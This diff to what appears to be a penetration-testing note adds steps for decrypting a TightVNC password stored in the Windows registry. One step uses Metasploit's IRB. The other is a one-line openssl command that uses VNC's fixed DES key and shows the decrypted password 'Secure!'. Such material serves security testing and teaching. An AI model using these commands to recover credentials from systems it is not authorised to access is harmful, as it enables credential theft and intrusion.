@@ -44,6 +44,7 @@ HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server
 With the encypted VNC password: 
 D7A514D8C556AADE  
 
+#### Metasploit Framework and the IRB (ruby shell)
 I was able decrypt it easily using the Metasploit Framework and the IRB (ruby shell) with these 3 commands:  
 fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"   
 require 'rex/proto/rfb'  
@@ -65,3 +66,13 @@ msf5 > irb
 >> 
 ```
 
+#### Native Linux Tools
+From https://github.com/billchaison/VNCDecrypt via https://miloserdov.org/?p=4854#65
+```BASH
+echo -n d7a514d8c556aade | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
+```
+Outputs
+```BASH
+00000000  53 65 63 75 72 65 21 00                           |Secure!.|
+00000008
+```
